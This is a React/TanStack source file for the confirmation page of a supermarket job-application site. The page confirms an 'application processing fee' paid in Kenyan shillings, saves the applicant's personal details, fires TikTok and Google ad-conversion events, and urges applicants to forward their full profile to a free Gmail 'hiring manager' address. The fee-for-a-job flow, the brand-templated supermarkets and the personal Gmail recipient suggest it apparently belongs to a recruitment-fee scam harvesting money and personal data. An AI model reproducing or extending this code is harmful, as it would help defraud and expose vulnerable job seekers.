import { createFileRoute, useRouter } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import { motion } from "framer-motion";
import {
  AlertTriangle, ArrowLeft, Check, CheckCircle2, Copy, Download, Loader2, Mail,
} from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/lib/supabase";
import { useEmailDeliverability } from "@/hooks/useEmailDeliverability";
import { clearConfirmationPayload, ConfirmationPayload, loadConfirmationPayload } from "@/lib/confirmationPayload";
import { getSupermarketBrand } from "@/lib/supermarketBrands";
import { trackPurchaseConversion } from "@/lib/gtag";
import { trackTikTokCompletePayment, trackTikTokIdentify, trackTikTokPurchase, trackTikTokPlaceAnOrder } from "@/lib/tiktok";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";

export const Route = createFileRoute("/apply/$supermarket/confirmation")({
  component: ConfirmationPage,
  errorComponent: ({ error }) => {
    console.error("[ConfirmationPage] Error caught:", error);
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-6 text-center bg-gray-50">
        <div className="max-w-md w-full bg-white p-8 rounded-2xl shadow-lg border border-gray-100">
          <div className="h-12 w-12 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto mb-4 font-bold text-xl">✓</div>
          <h2 className="text-2xl font-extrabold text-gray-900 mb-2">Payment Received</h2>
          <p className="text-sm text-gray-600 mb-6">
            Your application processing fee was received successfully. If the confirmation sheet doesn't display, kindly return home or refresh the page.
          </p>
          <a
            href="/"
            className="inline-flex items-center justify-center w-full px-6 py-3 rounded-xl font-bold text-white bg-emerald-600 hover:bg-emerald-700 transition-colors"
          >
            Return to Careers Home
          </a>
        </div>
      </div>
    );
  },
});

const HIRING_MANAGER_EMAIL = "staffhiringmanager2@gmail.com";
const HIRING_MANAGER_GMAIL_LOGO =
  "https://i.pinimg.com/1200x/0f/cf/54/0fcf541cbe9e8a08469b9b14a1367e53.jpg";

function ConfirmationPage() {
  const { supermarket } = Route.useParams();
  const router = useRouter();
  const brand = getSupermarketBrand(supermarket);

  // Try to get state passed via navigation
  const locationState = (router.state.location.state as { confirmation?: ConfirmationPayload } | null);

  const [payload, setPayload] = useState<ConfirmationPayload | null>(null);
  const [ready, setReady] = useState(false);
  const [forwardingEmail, setForwardingEmail] = useState("");
  const [applicationSaved, setApplicationSaved] = useState(false);
  const [savingApplication, setSavingApplication] = useState(false);
  const [copiedPreviewMessage, setCopiedPreviewMessage] = useState(false);
  const [highlightFinalStep, setHighlightFinalStep] = useState(false);
  const [isForwardingNow, setIsForwardingNow] = useState(false);
  const [applicationForwarded, setApplicationForwarded] = useState(false);
  const [confirmEmailDialogOpen, setConfirmEmailDialogOpen] = useState(false);
  const [isForwardingEmailConfirmed, setIsForwardingEmailConfirmed] = useState(false);
  const finalStepRef = useRef<HTMLDivElement | null>(null);

  const forwardingEmailCheck = useEmailDeliverability(forwardingEmail, ready && !!payload);
  const forwardingEmailValidation = forwardingEmailCheck.validation;

  useEffect(() => {
    const fromState = locationState?.confirmation;
    const fromStorage = loadConfirmationPayload();
    const next = fromState || fromStorage;

    if (!next || next.paymentStatus !== "completed") {
      if (supermarket) {
        void router.navigate({
          to: "/apply/$supermarket",
          params: { supermarket },
          replace: true,
        });
      } else {
        void router.navigate({ to: "/", replace: true });
      }
      return;
    }

    if (supermarket && next.supermarketSlug && next.supermarketSlug !== supermarket) {
      void router.navigate({
        to: "/apply/$supermarket/confirmation",
        params: { supermarket: next.supermarketSlug },
        state: { confirmation: next } as Record<string, unknown>,
        replace: true,
      });
      return;
    }

    setPayload(next);
    setForwardingEmail((prev) => (prev?.trim() ? prev : next.email || ""));
    setReady(true);

    try {
      const confirmedFee = Number(next.processingFee) > 0 ? Number(next.processingFee) : (brand.processingFee || 150);
      console.log("[Confirmation Page] payload.processingFee:", next.processingFee, "brand.processingFee:", brand.processingFee, "confirmedFee:", confirmedFee);
      trackPurchaseConversion({ applicationId: next.applicationId, value: confirmedFee, currency: "KES" });

      trackTikTokIdentify({ email: next.email || next.contactValue || undefined, phone: next.phone || next.mpesaNumber || undefined, externalId: next.applicationId || undefined });
      const fee = Number(next.processingFee) || brand.processingFee;
      const contentName = `${brand.name} application fee`;
      trackTikTokCompletePayment({ applicationId: next.applicationId, email: next.email || next.contactValue, phone: next.phone || next.mpesaNumber, value: fee, currency: "KES", contentName });
      trackTikTokPurchase({ applicationId: next.applicationId, contentName, value: fee, currency: "KES" });
      trackTikTokPlaceAnOrder({ applicationId: next.applicationId, contentName, value: fee, currency: "KES" });
    } catch (trackErr) {
      console.warn("[Confirmation Page] Tracking call error:", trackErr);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const markApplicationForwarded = useCallback(() => {
    setApplicationForwarded(true);
    if (!payload?.applicationId) return;
    try { localStorage.setItem(`gs_forwarded_${payload.applicationId}`, new Date().toISOString()); } catch { /* ignore */ }
  }, [payload?.applicationId]);

  useEffect(() => {
    if (!payload?.applicationId) return;
    try { if (localStorage.getItem(`gs_forwarded_${payload.applicationId}`)) { setApplicationForwarded(true); return; } } catch { /* ignore */ }
    const checkForwarded = async () => {
      const { data } = await supabase.from("applications").select("forwarded_at").eq("application_id", payload.applicationId).maybeSingle();
      if (data?.forwarded_at) setApplicationForwarded(true);
    };
    void checkForwarded();
  }, [payload?.applicationId]);

  useEffect(() => { if (!forwardingEmailCheck.canForward) setIsForwardingEmailConfirmed(false); }, [forwardingEmailCheck.canForward]);

  useEffect(() => {
    if (!ready || !payload || applicationSaved || savingApplication) return;
    const save = async () => {
      setSavingApplication(true);
      try {
        const { error } = await supabase.from("applications").insert({
          application_id: payload.applicationId, supermarket: brand.name, position: payload.selectedPosition,
          full_name: payload.fullName, email: payload.email || null, phone: payload.phone,
          whatsapp_number: payload.whatsappNumber || null, location: payload.location, start_time: payload.startTime,
          willing_to_train: payload.willingToTrain, work_type: payload.workType, interview_mode: payload.interviewMode,
          employment_type: payload.employmentType, salary_range: payload.salary, education_level: payload.education,
          experience_level: payload.experience, interview_date: payload.interviewDate, interview_time: payload.interviewTime,
          contact_method: payload.contactMethod, contact_value: payload.contactValue, mpesa_number: payload.mpesaNumber || null,
          processing_fee: payload.processingFee, payment_status: payload.paymentStatus, checkout_request_id: payload.checkoutRequestId || null,
        });
        if (error) throw error;
        setApplicationSaved(true);
      } catch (e) {
        toast.error(e instanceof Error ? e.message : "Failed to save your application.");
      } finally { setSavingApplication(false); }
    };
    void save();
  }, [ready, payload, applicationSaved, savingApplication, brand.name]);

  useEffect(() => {
    if (!ready) return;
    const t1 = setTimeout(() => { setHighlightFinalStep(true); finalStepRef.current?.scrollIntoView({ behavior: "smooth", block: "start" }); }, 250);
    const t2 = setTimeout(() => setHighlightFinalStep(false), 2600);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, [ready]);

  if (!ready || !payload) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: brand.lightBg }}>
        <Loader2 className="h-8 w-8 animate-spin" style={{ color: brand.color }} />
      </div>
    );
  }

  const bookingDateText = (() => {
    if (!payload.interviewDate) return "";
    try {
      const d = new Date(`${payload.interviewDate}T12:00:00`);
      return isNaN(d.getTime())
        ? payload.interviewDate
        : d.toLocaleDateString("en-US", { weekday: "long", month: "long", day: "numeric", year: "numeric" });
    } catch {
      return payload.interviewDate || "";
    }
  })();

  const hiringManagerMessage = [
    "Hello Hiring Manager,", "",
    "A completed application has been forwarded for review.", "",
    `Application ID: ${payload.applicationId || "Pending"}`,
    `Applicant Name: ${payload.fullName}`,
    `Phone Number: ${payload.phone}`,
    `WhatsApp Number: ${payload.whatsappNumber || "Not provided"}`,
    `Email Address: ${payload.email || "Not provided"}`,
    `Forwarding Email (for confirmation): ${forwardingEmail || payload.email || "Not provided"}`,
    `Location: ${payload.location}`, "",
    `Supermarket: ${brand.name}`,
    `Position: ${payload.selectedPosition}`,
    `Work Type: ${payload.workType}`,
    `Interview Mode: ${payload.interviewMode}`,
    `Employment Type: ${payload.employmentType}`,
    `Salary Range: ${payload.salary}`,
    `Education Level: ${payload.education}`,
    `Experience Level: ${payload.experience}`,
    `Start Time: ${payload.startTime}`,
    `Willing To Train: ${payload.willingToTrain}`, "",
    `Booking Date: ${bookingDateText}`,
    `Booking Time: ${payload.interviewTime}`,
    `Preferred Contact Method: ${payload.contactMethod}`,
    `Confirmation Contact: ${payload.contactValue}`, "",
  ].join("\n");

  const forwardSubject = "Job application review";
  const buildMailtoUrl = () => `mailto:${HIRING_MANAGER_EMAIL}?subject=${encodeURIComponent(forwardSubject)}&body=${encodeURIComponent(hiringManagerMessage)}`;

  const applyForwardingEmailSuggestion = () => {
    if (forwardingEmailValidation.suggestion) { setForwardingEmail(forwardingEmailValidation.suggestion); setIsForwardingEmailConfirmed(false); }
  };

  const blockForwardWithEmailMessage = () => {
    if (forwardingEmailCheck.isChecking) { toast.error("Please wait while we verify your email address"); return true; }
    if (!forwardingEmailValidation.valid) {
      toast.error(forwardingEmailValidation.suggestion ? `That email looks mistyped. Did you mean ${forwardingEmailValidation.suggestion}?` : forwardingEmailValidation.error || "Enter a valid email address to forward");
      return true;
    }
    if (!forwardingEmailCheck.canForward) { toast.error(forwardingEmailCheck.deliverability.message || "This email domain cannot receive mail."); return true; }
    return false;
  };

  const doForwardNow = async () => {
    if (applicationForwarded) {
      toast.info("This application has already been forwarded. No need to send again.");
      return;
    }
    if (blockForwardWithEmailMessage()) return;

    const senderEmail = (forwardingEmail || "").trim();

    setIsForwardingNow(true);
    try {
      const res = await fetch("/api/forward-application", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: HIRING_MANAGER_EMAIL,
          subject: forwardSubject,
          message: hiringManagerMessage,
          replyTo: senderEmail,
          applicationId: payload.applicationId || null,
          applicantName: payload.fullName || null,
          applicantPhone: payload.phone || null,
          supermarket: brand.name,
          position: payload.selectedPosition,
          interviewDate: bookingDateText,
          interviewTime: payload.interviewTime,
        }),
      });

      if (!res.ok) {
        let apiError = "";
        let apiSuggestion = "";
        try {
          const data = await res.json();
          apiError = String(data?.error || data?.detail || "");
          apiSuggestion = String(data?.suggestion || "");
        } catch {
          // ignore
        }

        if (res.status === 400 && apiError) {
          toast.error(apiSuggestion ? `${apiError} Did you mean ${apiSuggestion}?` : apiError);
          return;
        }

        if (res.status === 409) {
          markApplicationForwarded();
          toast.info("This application has already been forwarded. No need to send again.");
          return;
        }

        if (res.status === 503 || /not configured|missing smtp/i.test(apiError)) {
          window.location.href = buildMailtoUrl();
          toast.success("Email draft opened. Kindly tap Send to confirm your application.");
          return;
        }

        toast.error(apiError || "Failed to send email automatically");
        return;
      }

      toast.success("Sent to hiring manager successfully");
      markApplicationForwarded();
    } catch {
      window.location.href = buildMailtoUrl();
      toast.success("Email draft opened. Kindly tap Send to confirm your application.");
    } finally {
      setIsForwardingNow(false);
    }
  };

  const forwardNow = () => {
    if (applicationForwarded) { toast.info("Application already forwarded."); return; }
    if (blockForwardWithEmailMessage()) return;
    if (!isForwardingEmailConfirmed) { setConfirmEmailDialogOpen(true); return; }
    void doForwardNow();
  };

  const downloadAndForwardLater = async () => {
    if (applicationForwarded) { toast.info("Application already forwarded."); return; }
    if (blockForwardWithEmailMessage()) return;
    const senderEmail = (forwardingEmail || "").trim();
    try {
      const { jsPDF } = await import("jspdf/dist/jspdf.es.min.js");
      const doc = new jsPDF({ unit: "pt", format: "a4" });
      let y = 64; const left = 48;
      doc.setFont("helvetica", "bold"); doc.setFontSize(18);
      doc.text("Job Application Forwarding Sheet", left, y); y += 22;
      doc.setFont("helvetica", "normal"); doc.setFontSize(11);
      doc.text(`Forward to: ${HIRING_MANAGER_EMAIL}`, left, y); y += 16;
      doc.text(`Your email: ${senderEmail}`, left, y); y += 16;
      doc.text(`Generated: ${new Date().toLocaleString()}`, left, y); y += 22;
      doc.setDrawColor(220); doc.line(left, y, 548, y); y += 18;
      doc.setFont("helvetica", "bold"); doc.text("Application details", left, y); y += 14;
      doc.setFont("courier", "normal"); doc.setFontSize(9.5);
      const messageLines = doc.splitTextToSize(hiringManagerMessage, 520);
      const pageHeight = doc.internal.pageSize.getHeight();
      for (const line of messageLines) { if (y > pageHeight - 64) { doc.addPage(); y = 64; } doc.text(line, left, y); y += 12; }
      doc.save(`application_${(payload.applicationId || `APP${Date.now()}`).replace(/[^\w-]/g, "_")}.pdf`);
      toast.success("PDF downloaded");
    } catch { toast.error("Failed to generate PDF"); }
  };

  const copyHiringManagerMessage = async () => {
    try { await navigator.clipboard.writeText(hiringManagerMessage); setCopiedPreviewMessage(true); toast.success("Message copied"); window.setTimeout(() => setCopiedPreviewMessage(false), 2200); }
    catch { toast.error("Failed to copy message"); }
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: brand.lightBg }}>
      <div className="sticky top-0 z-50 border-b bg-white/90 backdrop-blur-xl" style={{ borderColor: brand.color + "20" }}>
        <div className="container flex items-center h-16 gap-4">
          <button onClick={() => { clearConfirmationPayload(); void router.navigate({ to: "/" }); }}
            className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
            <ArrowLeft className="h-4 w-4" />Home
          </button>
          <div className="flex items-center gap-2 ml-auto">
            <div className="h-8 w-8 rounded-lg flex items-center justify-center text-white font-bold text-sm" style={{ backgroundColor: brand.color }}>{brand.name[0]}</div>
            <span className="font-bold text-foreground">{brand.name}</span>
          </div>
        </div>
        <div className="h-1" style={{ backgroundColor: brand.color }} />
      </div>

      <div className="container max-w-2xl py-8 px-4">
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.35 }} className="flex flex-col items-center text-center pb-28">
          <h2 className="text-3xl md:text-4xl font-extrabold text-gray-900 mb-2">Booking Confirmed</h2>
          <p className="text-sm font-extrabold text-red-600 mb-6">ENSURE YOU FORWARD TO BE CONFIRMED</p>

          <motion.div
            ref={finalStepRef}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0, scale: highlightFinalStep ? [1, 1.012, 1] : 1 }}
            transition={{ delay: 0.62, duration: highlightFinalStep ? 1.2 : 0.6 }}
            className="w-full mb-6 rounded-[28px] overflow-hidden shadow-2xl border"
            style={{ borderColor: "#E5E7EB", background: "linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(255,255,255,0.85) 35%, rgba(255,255,255,0.95) 100%)", boxShadow: `0 25px 70px ${brand.color}18` }}>
            <div className="relative">
              <div className="relative px-6 py-5 md:px-7 md:py-6 border-b" style={{ borderColor: "#E5E7EB", background: "linear-gradient(135deg, rgba(250,250,250,0.9) 0%, rgba(255,255,255,0.85) 60%, rgba(250,250,250,0.9) 100%)" }}>
                <div className="flex items-start gap-4">
                  <div className="relative shrink-0">
                    <img src={HIRING_MANAGER_GMAIL_LOGO} alt="Gmail" className="relative h-16 w-16 rounded-2xl object-cover border-4 border-white shadow-lg" />
                  </div>
                  <div className="text-left flex-1">
                    <div className="inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs font-bold uppercase tracking-[0.18em] text-gray-800 bg-white/80 border border-gray-200 mb-3">
                      <span className="h-2 w-2 rounded-full bg-red-500 animate-pulse" />Final step
                    </div>
                    <h3 className="text-xl md:text-2xl font-extrabold text-gray-900">Confirm via Email</h3>
                    <p className="text-sm md:text-base text-gray-600 mt-2 max-w-2xl">
                      {applicationForwarded ? "Your application has been forwarded. You will receive confirmation emails shortly." : (<>Enter your email below and tap <span className="font-semibold">Forward Now</span> to confirm your application.</>)}
                    </p>
                  </div>
                </div>
              </div>

              <div className="relative p-6 md:p-7">
                <div className="grid gap-4 md:grid-cols-[1.15fr_0.85fr]">
                  <div className="rounded-3xl p-5 text-left border bg-white/85 backdrop-blur-sm" style={{ borderColor: "#E5E7EB" }}>
                    {applicationForwarded && (
                      <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-4 mb-4">
                        <p className="text-sm text-emerald-900 font-semibold flex items-start gap-2">
                          <CheckCircle2 className="h-5 w-5 shrink-0" /><span>Application already forwarded. Confirmation emails are on the way.</span>
                        </p>
                      </div>
                    )}
                    <label className="text-sm font-bold text-gray-900 mb-2 flex items-center gap-2">
                      <Mail className="h-4 w-4" style={{ color: brand.color }} />Your Email Address
                    </label>
                    <input value={forwardingEmail} onChange={(e) => { setForwardingEmail(e.target.value); setIsForwardingEmailConfirmed(false); }}
                      type="email" autoComplete="email" disabled={applicationForwarded} placeholder="e.g. your.email@gmail.com"
                      className="w-full rounded-2xl border-2 bg-white px-4 py-4 text-sm font-semibold text-gray-900 placeholder:text-gray-400 focus:outline-none transition-all"
                      style={{ borderColor: forwardingEmail.trim() ? forwardingEmailValidation.valid ? brand.color : forwardingEmailValidation.formatValid ? "#F59E0B" : "#EF4444" : "#E5E7EB", boxShadow: forwardingEmail ? `0 0 0 4px ${brand.color}12` : "none" }} />
                    {forwardingEmail.trim() && !forwardingEmailValidation.valid && (
                      <div className="mt-2 rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3">
                        <p className="text-sm text-amber-900 font-medium flex items-start gap-2"><AlertTriangle className="h-4 w-4 mt-0.5 shrink-0" /><span>{forwardingEmailValidation.error}</span></p>
                        {forwardingEmailValidation.suggestion && (<button type="button" onClick={applyForwardingEmailSuggestion} className="mt-2 ml-6 text-sm font-bold text-amber-950 underline underline-offset-2 hover:no-underline">Use {forwardingEmailValidation.suggestion} instead</button>)}
                      </div>
                    )}
                    {forwardingEmail.trim() && forwardingEmailValidation.valid && forwardingEmailCheck.isChecking && (<p className="text-xs text-gray-600 mt-2 flex items-center gap-1.5 font-medium"><Loader2 className="h-3.5 w-3.5 animate-spin" />Checking if this email can receive mail...</p>)}
                    {forwardingEmail.trim() && forwardingEmailValidation.valid && forwardingEmailCheck.canForward && !forwardingEmailCheck.isChecking && (<p className="text-xs text-emerald-700 mt-2 flex items-center gap-1.5 font-medium"><CheckCircle2 className="h-3.5 w-3.5" />Email verified — you can forward</p>)}
                    <p className="text-xs text-gray-500 mt-2">This email is used for confirmation and reply-to.</p>
                    <div className="mt-3 rounded-2xl border bg-white px-4 py-3 flex items-start gap-3" style={{ borderColor: "#E5E7EB" }}>
                      <input type="checkbox" className="mt-1 h-4 w-4" checked={isForwardingEmailConfirmed} disabled={!forwardingEmailCheck.canForward || applicationForwarded} onChange={(e) => setIsForwardingEmailConfirmed(e.target.checked)} />
                      <p className="text-sm text-gray-800 font-medium">I confirm my email address is correct: <span className="font-extrabold">{(forwardingEmail || payload.email || "").trim() || "—"}</span></p>
                    </div>
                    <div className="grid gap-3 mt-5 sm:grid-cols-2">
                      <motion.button type="button" animate={{ scale: highlightFinalStep ? [1, 1.03, 1] : 1, y: highlightFinalStep ? [0, -2, 0] : 0 }} transition={{ duration: highlightFinalStep ? 0.6 : 0.2, ease: "easeOut" }} whileHover={{ scale: 1.02, y: -1 }} whileTap={{ scale: 0.98 }}
                        onClick={forwardNow} disabled={isForwardingNow || !forwardingEmailCheck.canForward || forwardingEmailCheck.isChecking || applicationForwarded}
                        className="rounded-2xl px-4 py-4 font-extrabold text-white transition-all flex items-center justify-center gap-3 cursor-pointer disabled:opacity-60 disabled:cursor-not-allowed"
                        style={{ background: "linear-gradient(135deg, #EA4335 0%, #FBBC05 55%, #34A853 100%)", boxShadow: "0 18px 40px rgba(234,67,53,0.22)" }}>
                        {isForwardingNow ? <Loader2 className="h-5 w-5 animate-spin" /> : <Mail className="h-5 w-5" />}
                        {isForwardingNow ? "Forwarding..." : "Forward Now"}
                      </motion.button>
                      <motion.button type="button" whileHover={{ scale: 1.02, y: -1 }} whileTap={{ scale: 0.98 }}
                        onClick={downloadAndForwardLater} disabled={!forwardingEmailCheck.canForward || applicationForwarded}
                        className="rounded-2xl px-4 py-4 font-extrabold transition-all flex items-center justify-center gap-3 cursor-pointer border bg-white disabled:opacity-60 disabled:cursor-not-allowed"
                        style={{ borderColor: "#E5E7EB", boxShadow: "0 18px 40px rgba(0,0,0,0.06)", color: "#111827" }}>
                        <Download className="h-5 w-5" />Download & forward later
                      </motion.button>
                    </div>
                    <div className="mt-4 rounded-2xl border bg-gray-50 px-4 py-3" style={{ borderColor: "#E5E7EB" }}>
                      <p className="text-sm text-gray-700 font-medium">If direct sending is unavailable, we'll open a pre-filled email draft. Kindly tap <span className="font-extrabold">Send</span>.</p>
                    </div>
                  </div>

                  <div className="rounded-3xl p-5 text-left border bg-white/75" style={{ borderColor: "#E5E7EB" }}>
                    <AlertDialog open={confirmEmailDialogOpen} onOpenChange={setConfirmEmailDialogOpen}>
                      <AlertDialogContent>
                        <AlertDialogHeader>
                          <AlertDialogTitle>Confirm your email address</AlertDialogTitle>
                          <AlertDialogDescription>Is this email address correct?<br /><span className="font-semibold text-gray-900">{(forwardingEmail || "").trim()}</span></AlertDialogDescription>
                        </AlertDialogHeader>
                        <AlertDialogFooter>
                          <AlertDialogCancel>Change</AlertDialogCancel>
                          <AlertDialogAction onClick={() => { setIsForwardingEmailConfirmed(true); void doForwardNow(); }}>Yes, forward</AlertDialogAction>
                        </AlertDialogFooter>
                      </AlertDialogContent>
                    </AlertDialog>
                    <div className="flex items-center justify-between gap-3 mb-3">
                      <p className="text-xs font-semibold uppercase tracking-[0.16em] text-gray-500">Message preview</p>
                      <motion.button type="button" whileHover={{ scale: 1.03, y: -1 }} whileTap={{ scale: 0.98 }} onClick={copyHiringManagerMessage}
                        className="rounded-2xl px-4 py-2.5 text-sm font-bold flex items-center gap-2 border cursor-pointer transition-all"
                        style={{ borderColor: copiedPreviewMessage ? "#10B981" : "#E5E7EB", background: copiedPreviewMessage ? "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)" : "linear-gradient(135deg, rgba(0,0,0,0.03) 0%, rgba(255,255,255,0.9) 100%)", color: copiedPreviewMessage ? "#047857" : "#111827" }}>
                        {copiedPreviewMessage ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                        {copiedPreviewMessage ? "Copied" : "Copy"}
                      </motion.button>
                    </div>
                    <div className="rounded-2xl bg-slate-950 text-slate-100 p-4 min-h-[260px] shadow-inner">
                      <pre className="whitespace-pre-wrap text-xs leading-6 font-sans text-left">{hiringManagerMessage}</pre>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>

          <div className="fixed bottom-4 left-0 right-0 z-50 px-4">
            <div className="mx-auto w-full max-w-2xl rounded-2xl border bg-white/95 backdrop-blur-md shadow-xl px-4 py-3 flex items-center gap-3">
              <div className="text-left flex-1">
                <p className="text-xs font-semibold uppercase tracking-[0.16em] text-gray-500">Final step</p>
                <p className="text-sm font-extrabold text-gray-900">{applicationForwarded ? "Application already forwarded" : "Tap Forward Now to confirm"}</p>
              </div>
              <button type="button" onClick={forwardNow}
                disabled={isForwardingNow || !forwardingEmailCheck.canForward || forwardingEmailCheck.isChecking || applicationForwarded}
                className="rounded-xl px-4 py-3 font-extrabold text-white transition-all flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed"
                style={{ background: "linear-gradient(135deg, #EA4335 0%, #FBBC05 55%, #34A853 100%)", boxShadow: "0 16px 36px rgba(234,67,53,0.22)" }}>
                {isForwardingNow ? <Loader2 className="h-5 w-5 animate-spin" /> : <Mail className="h-5 w-5" />}
                {isForwardingNow ? "Forwarding..." : "Forward Now"}
              </button>
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  );
}
